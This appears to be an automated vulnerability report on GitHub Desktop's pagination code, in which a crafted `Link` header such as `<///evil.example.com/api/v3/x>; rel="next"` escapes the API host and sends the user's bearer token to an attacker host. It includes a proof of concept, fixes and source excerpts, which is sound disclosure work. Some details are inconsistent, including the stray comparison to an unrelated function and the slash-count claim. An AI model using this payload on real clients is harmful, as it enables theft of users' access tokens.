### Title
Malicious `Link` header `next` URL bypasses host confinement via protocol-relative path, causing bearer-token exfiltration to attacker-controlled host - (File: `app/src/lib/api.ts`, `app/src/lib/http.ts`)

### Summary
`SafeApplyFuncOnAllActiveEpochEndingTopics`'s bug class is "an attacker-influenced loop/pagination boundary is not validated before it is used to drive further processing." The Desktop analog is `fetchAll`'s pagination follow logic: the "next page" location is derived directly from an HTTP response header supplied by the remote server (or any proxy/MITM sitting on that connection) and is not properly re-validated against the original API host before being used to issue the next authenticated request.

### Finding Description
`fetchAll` drives GitHub API pagination by repeatedly requesting whatever `nextPath` was computed from the previous response, with no boundary check on the value's origin: [1](#0-0) 

The default `nextPath` calculator, `getNextPagePathFromLink`, parses the RFC 5988 `Link` response header and returns only the `.path` of whatever URL string is found between `< >`: [2](#0-1) 

This regex only requires `<...>; rel="next"` — it does not require the captured value to be a full, same-origin URL. It is passed to (legacy) `url.parse()`, which, when the captured string is not a well-formed absolute URL, treats the whole string as a `pathname` and copies it verbatim into `.path`, including any leading slashes (Node's `url.parse` only recognizes `//host` syntax as a host when a scheme precedes it or `slashesDenoteHost` is explicitly passed, neither of which applies here).

That `nextPath` value is fed straight into `ghRequest('GET', nextPath)` → `request()` → `getAbsoluteUrl(endpoint, path)`: [3](#0-2) 

`getAbsoluteUrl` strips only a single leading slash from `path` before resolving it against `endpoint` with `new URL(relativePath, base)`. If the attacker-controlled `Link` value contains three (or any odd count ≥3) leading slashes before a hostname (e.g. `///evil.example.com/x`), stripping one leaves exactly two leading slashes (`//evil.example.com/x`). Per the WHATWG URL resolution algorithm, a relative reference starting with `//` is a "network-path reference": `new URL("//evil.example.com/x", "https://api.github.com/")` resolves to `https://evil.example.com/x`, taking the scheme from `base` but the **host from the attacker string**, escaping the intended `endpoint` origin entirely.

The resulting request is still made through `request()`, which unconditionally attaches the user's OAuth/PAT bearer token: [4](#0-3) 

Nothing downstream re-validates that the final request host matches `endpoint`'s host, so the Authorization header is sent to the attacker-controlled host embedded in the malicious `Link` header.

### Impact Explanation
This is a real credential/token exfiltration primitive: the GitHub Desktop process itself, using code the app trusts, sends the user's live `Authorization: Bearer <token>` header to a host chosen by whoever controls the HTTP response (a compromised/malicious GitHub Enterprise server, or any network intermediary/proxy able to alter the `Link` response header) during any `fetchAll`-based call — issues, pull requests, repository lists, rulesets, mentionables, etc. (all call sites shown at `app/src/lib/api.ts:1175`, `1191`, `1230`, `1045`). A leaked PAT/OAuth token grants the attacker the same repository access as the victim, including private repo read/write, matching the "credential/token exfiltration" category in the accepted impact list.

### Likelihood Explanation
The attacker model required — controlling a git remote/API/proxy response the client talks to (e.g., a malicious or compromised GitHub Enterprise instance, or a network path capable of tampering with HTTP response headers) — is explicitly in scope per the task's valid-impact list ("a git remote/proxy response"). No local access, admin rights, or social engineering of the user is needed beyond the user already having added/using that GHE/proxy endpoint, which is normal Desktop usage (Enterprise support is a first-class feature). The path only triggers when a paginated endpoint is queried and a next-page Link header is present, which is common for any repo/org with more than one page of results, so the trigger condition is easily reachable, not a corner case.

### Recommendation
- In `getNextPagePathFromLink` (and `getNextPagePathWithIncreasingPageSize`), validate that the parsed `Link` URL's `protocol`+`host` (when present) matches the current `endpoint`'s origin; reject/ignore the header otherwise.
- In `getAbsoluteUrl`, explicitly reject/normalize any `path` that begins with two or more slashes after stripping, so it can never be interpreted as a network-path (protocol-relative) reference by `new URL()`.
- As defense in depth, after computing the absolute URL in `request()`, assert `new URL(url).origin === new URL(endpoint).origin` before attaching the `Authorization` header, and drop the token if it does not match.

### Proof of Concept
1. Point Desktop at a malicious or MITM'd GitHub Enterprise endpoint (`endpoint = https://ghe.attacker-controlled-or-mitm.example/api/v3`).
2. Trigger any paginated call, e.g. `fetchIssues`/`fetchAllOpenPullRequests` (`app/src/lib/api.ts:1175`, `1191`), which invokes `fetchAll`.
3. Have the (malicious/compromised/MITM) server return, on the first page response, the header:
   `Link: <///evil.example.com/api/v3/x>; rel="next"`
4. `getNextPagePathFromLink` returns `nextURL.path = "///evil.example.com/api/v3/x"`.
5. `fetchAll`'s loop condition (`while (nextPath && ...)`, `app/src/lib/api.ts:1801`) causes a second iteration, calling `ghRequest('GET', "///evil.example.com/api/v3/x")`.
6. `getAbsoluteUrl` strips one leading slash → `"//evil.example.com/api/v3/x"`, then `new URL(relativePath, base)` resolves to `https://evil.example.com/api/v3/x`.
7. `request()` attaches `Authorization: Bearer <user's token>` and issues the GET to `evil.example.com`, exfiltrating the token to the attacker.

function getNextPagePathFromLink(response: Response): string | null {
  const linkHeader = response.headers.get('Link')

  if (!linkHeader) {
    return null
  }

  for (const part of linkHeader.split(',')) {
    // https://github.com/philschatz/octokat.js/blob/5658abe442e8bf405cfda1c72629526a37554613/src/plugins/pagination.js#L17
    const match = part.match(/<([^>]+)>; rel="([^"]+)"/)

    if (match && match[2] === 'next') {
      const nextURL = URL.parse(match[1])
      return nextURL.path || null
    }
  }

  return null
}

export function getAbsoluteUrl(endpoint: string, path: string): string {
  let relativePath = path[0] === '/' ? path.substring(1) : path
  if (relativePath.startsWith('api/v3/')) {
    relativePath = relativePath.substring(7)
  }

  // Our API endpoints are a bit sloppy in that they don't typically
  // include the trailing slash (i.e. we use https://api.github.com for
  // dotcom and https://ghe.enterprise.local/api/v3 for Enterprise when
  // both of those should really include the trailing slash since that's
  // the qualified base). We'll work around our past since here by ensuring
  // that the endpoint ends with a trailing slash.
  const base = endpoint.endsWith('/') ? endpoint : `${endpoint}/`

  return new URL(relativePath, base).toString()
}

export function request(
  endpoint: string,
  token: string | null,
  method: HTTPMethod,
  path: string,
  jsonBody?: Object,
  customHeaders?: Object,
  reloadCache: boolean = false
): Promise<Response> {
  const url = getAbsoluteUrl(endpoint, path)

  let headers: any = {
    Accept: 'application/vnd.github.v3+json, application/json',
    'Content-Type': 'application/json',
    'User-Agent': getUserAgent(),
  }

  if (token) {
    headers['Authorization'] = `Bearer ${token}`
  }

  headers = {
    ...headers,
    ...customHeaders,
  }

  const options: RequestInit = {
    headers,
    method,
    body: JSON.stringify(jsonBody),
  }

  if (reloadCache) {
    options.cache = 'reload' as RequestCache
  }

  return fetch(url, options)
}
